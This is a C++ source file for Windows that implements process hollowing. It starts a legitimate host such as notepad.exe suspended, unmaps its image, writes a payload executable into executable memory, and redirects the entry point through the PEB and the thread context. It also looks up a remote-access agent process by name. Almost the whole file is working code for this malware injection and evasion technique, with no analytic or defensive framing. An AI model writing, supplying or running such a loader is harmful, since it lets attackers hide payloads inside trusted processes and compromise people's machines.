#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <vector> // For std::vector
#include <string> // For std::string (though not strictly needed for this specific change, good practice for C++ projects)
#include <string.h>

/**
 * Retrieves the Process ID (PID) of a running process by its executable name.
 * 
 * @param processName The name of the executable (e.g., "dwagent.exe").
 * @return The DWORD PID if found; otherwise, 0.
 */
DWORD GetProcessIdByName(const char* processName) {
    DWORD processId = 0;

    // Take a snapshot of all processes currently in the system
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnapshot == INVALID_HANDLE_VALUE) {
        // Handle error: could not create snapshot
        return 0;
    }

    PROCESSENTRY32 pe32;
    // The size of the structure must be initialized before use
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Retrieve information about the first process
    if (!Process32First(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return 0;
    }

    // Walk through the snapshot of processes
    do {
        // Case-insensitive comparison of the executable name
        // Note: Use _stricmp for char* or _wcsicmp for wchar_t*
        if (_stricmp(pe32.szExeFile, processName) == 0) {
            processId = pe32.th32ProcessID;
            break;
        }
    } while (Process32Next(hSnapshot, &pe32));

    // Always clean up the snapshot handle
    CloseHandle(hSnapshot);

    return processId;
}

/**
 * Creates a new process in a suspended state.
 * 
 * @param targetPath The full path to the executable.
 * @return PROCESS_INFORMATION containing handles and IDs of the new process.
 */
PROCESS_INFORMATION CreateSuspendedProcess(const char* targetPath) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcessA(
        targetPath,       // Application name
        NULL,             // Command line
        NULL,             // Process attributes
        NULL,             // Thread attributes
        FALSE,            // Inherit handles
        CREATE_SUSPENDED, // Creation flags
        NULL,             // Environment
        NULL,             // Current directory
        &si,              // Startup info
        &pi               // Process information
    )) {
        std::cerr << "CreateProcessA failed (" << GetLastError() << ")." << std::endl;
    }

    return pi;
}

/**
 * Reads a PE file from disk into a byte buffer.
 *
 * @param filePath The full path to the PE file.
 * @return A std::vector<BYTE> containing the file's content. Returns an empty vector on failure.
 *         The size of the buffer can be obtained using .size() on the returned vector.
 */
std::vector<BYTE> ReadPeFileIntoBuffer(const char* filePath) {
    std::vector<BYTE> buffer;

    if (filePath == nullptr || strlen(filePath) == 0) {
        std::cerr << "Error: File path cannot be null or empty." << std::endl;
        return buffer;
    }

    // Open the file for reading
    HANDLE hFile = CreateFileA(
        filePath,
        GENERIC_READ,          // Desired access: read
        FILE_SHARE_READ,       // Share mode: allow other processes to read
        NULL,                  // Security attributes
        OPEN_EXISTING,         // Creation disposition: file must exist
        FILE_ATTRIBUTE_NORMAL, // Flags and attributes
        NULL                   // Template file
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        std::cerr << "Error: Could not open file '" << filePath << "' (Error code: " << GetLastError() << ")" << std::endl;
        return buffer;
    }

    // Get the size of the file
    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        std::cerr << "Error: Could not get file size for '" << filePath << "' (Error code: " << GetLastError() << ")" << std::endl;
        CloseHandle(hFile);
        return buffer;
    }

    // Resize the buffer to hold the entire file content
    buffer.resize(fileSize);

    // Read the file content into the buffer
    DWORD bytesRead = 0;
    if (!ReadFile(hFile, buffer.data(), fileSize, &bytesRead, NULL)) {
        std::cerr << "Error: Could not read file '" << filePath << "' (Error code: " << GetLastError() << ")" << std::endl;
        CloseHandle(hFile);
        return std::vector<BYTE>(); // Return empty vector on read failure
    }

    // Close the file handle
    CloseHandle(hFile);

    if (bytesRead != fileSize) {
        std::cerr << "Warning: Read " << bytesRead << " bytes, but expected " << fileSize << " bytes for '" << filePath << "'" << std::endl;
    }

    return buffer;
}

/**
 * Performs Process Hollowing: Replaces the memory of a host process with a payload executable.
 * 
 * @param payloadPath Path to the replacement executable (must match architecture of host).
 * @param hostPath Path to the legitimate process to be hollowed.
 * @return true if successful, false otherwise.
 */
bool ProcessHollowing(const char* payloadPath, const char* hostPath) {
    // 1. Read the payload PE file from disk
    std::vector<BYTE> payloadBuffer = ReadPeFileIntoBuffer(payloadPath);
    if (payloadBuffer.empty()) return false;

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payloadBuffer.data();
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(payloadBuffer.data() + dosHeader->e_lfanew);

    // 2. Create the host process in a suspended state
    PROCESS_INFORMATION pi = CreateSuspendedProcess(hostPath);
    if (pi.hProcess == NULL) return false;

    bool success = false;
    do {
        // 3. Get the thread context of the suspended process
        CONTEXT context;
        context.ContextFlags = CONTEXT_FULL;
        if (!GetThreadContext(pi.hThread, &context)) {
            std::cerr << "[-] Failed to get thread context." << std::endl;
            break;
        }

        // 4. Locate the host's Image Base from the PEB
        // x64: Rdx points to PEB, ImageBase at PEB + 0x10. x86: Ebx points to PEB, ImageBase at PEB + 0x08.
        PVOID hostImageBase = nullptr;
#ifdef _WIN64
        ReadProcessMemory(pi.hProcess, (PVOID)(context.Rdx + 0x10), &hostImageBase, sizeof(PVOID), NULL);
#else
        ReadProcessMemory(pi.hProcess, (PVOID)(context.Ebx + 0x08), &hostImageBase, sizeof(PVOID), NULL);
#endif

        // 5. Unmap the host's original code
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        auto NtUnmapViewOfSection = (long (NTAPI*)(HANDLE, PVOID))GetProcAddress(hNtdll, "NtUnmapViewOfSection");
        
        if (NtUnmapViewOfSection) {
            NtUnmapViewOfSection(pi.hProcess, hostImageBase);
        } else {
            std::cerr << "[-] Failed to resolve NtUnmapViewOfSection." << std::endl;
            break;
        }

        // 6. Allocate new memory for the payload in the host process
        PVOID remoteImageBase = VirtualAllocEx(
            pi.hProcess, 
            (PVOID)ntHeaders->OptionalHeader.ImageBase, 
            ntHeaders->OptionalHeader.SizeOfImage, 
            MEM_COMMIT | MEM_RESERVE, 
            PAGE_EXECUTE_READWRITE
        );

        if (!remoteImageBase) {
            std::cerr << "[-] Failed to allocate memory at preferred base. Attempting dynamic allocation..." << std::endl;
            remoteImageBase = VirtualAllocEx(pi.hProcess, NULL, ntHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (!remoteImageBase) break;
        }

        // 7. Copy payload headers and sections into the allocated memory
        if (!WriteProcessMemory(pi.hProcess, remoteImageBase, payloadBuffer.data(), ntHeaders->OptionalHeader.SizeOfHeaders, NULL)) {
            std::cerr << "[-] Failed to write PE headers." << std::endl;
            break;
        }

        PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
        for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
            PVOID sectionDest = (PVOID)((LPBYTE)remoteImageBase + sectionHeader[i].VirtualAddress);
            PVOID sectionSrc = (PVOID)(payloadBuffer.data() + sectionHeader[i].PointerToRawData);
            
            if (!WriteProcessMemory(pi.hProcess, sectionDest, sectionSrc, sectionHeader[i].SizeOfRawData, NULL)) {
                std::cerr << "[-] Failed to write section: " << sectionHeader[i].Name << std::endl;
                break;
            }
        }

        // 8. Update the PEB with the new Image Base and the Context with the new Entry Point
#ifdef _WIN64
        WriteProcessMemory(pi.hProcess, (PVOID)(context.Rdx + 0x10), &remoteImageBase, sizeof(PVOID), NULL);
        context.Rcx = (DWORD64)remoteImageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
#else
        WriteProcessMemory(pi.hProcess, (PVOID)(context.Ebx + 0x08), &remoteImageBase, sizeof(PVOID), NULL);
        context.Eax = (DWORD)remoteImageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
#endif

        // 9. Apply the updated context and resume the thread
        if (!SetThreadContext(pi.hThread, &context)) {
            std::cerr << "[-] Failed to set new thread context." << std::endl;
            break;
        }

        if (ResumeThread(pi.hThread) == -1) {
            std::cerr << "[-] Failed to resume hollowed process." << std::endl;
            break;
        }

        std::cout << "[+] Process hollowing successful! PID: " << pi.dwProcessId << std::endl;
        success = true;
    } while (false);

    if (!success) {
        TerminateProcess(pi.hProcess, 0);
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return success;
}

int main() {
    // --- Test GetProcessIdByName ---
    const char* targetProcess = "dwagent.exe"; // Replace with a process you expect to be running
    DWORD pid = GetProcessIdByName(targetProcess);

    if (pid != 0) {
        std::cout << "Found " << targetProcess << " with PID: " << pid << std::endl;
    } else {
        std::cout << "Process '" << targetProcess << "' not found or error occurred." << std::endl;
    }

    std::cout << "\n----------------------------------------\n" << std::endl;

    // --- Test CreateSuspendedProcess ---
    const char* suspendedTargetPath = "C:\\Windows\\System32\\notepad.exe"; // Example path, ensure it exists
    std::cout << "Attempting to create suspended process: " << suspendedTargetPath << std::endl;
    PROCESS_INFORMATION pi = CreateSuspendedProcess(suspendedTargetPath);

    if (pi.hProcess != NULL) {
        std::cout << "Successfully created suspended process: " << suspendedTargetPath << std::endl;
        std::cout << "  Process ID: " << pi.dwProcessId << std::endl;
        std::cout << "  Thread ID: " << pi.dwThreadId << std::endl;
        // IMPORTANT: Remember to close handles when done with the process and thread
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        std::cout << "Closed process and thread handles." << std::endl;
    } else {
        std::cout << "Failed to create suspended process: " << suspendedTargetPath << std::endl;
    }

    std::cout << "\n----------------------------------------\n" << std::endl;

    // --- Test ReadPeFileIntoBuffer ---
    const char* peFilePath = "C:\\Windows\\System32\\notepad.exe"; // Example PE file, ensure it exists
    std::cout << "Attempting to read PE file: " << peFilePath << std::endl;
    std::vector<BYTE> peBuffer = ReadPeFileIntoBuffer(peFilePath);

    if (!peBuffer.empty()) {
        std::cout << "Successfully read PE file '" << peFilePath << "' into buffer." << std::endl;
        std::cout << "Buffer size: " << peBuffer.size() << " bytes." << std::endl;
        // You can now access the raw byte data using peBuffer.data()
        // For example, to print the first few bytes:
        // for (size_t i = 0; i < std::min((size_t)16, peBuffer.size()); ++i) {
        //     std::cout << std::hex << (int)peBuffer[i] << " ";
        // }
        // std::cout << std::dec << std::endl;
    } else {
        std::cout << "Failed to read PE file '" << peFilePath << "' into buffer." << std::endl;
    }

    return 0;
}
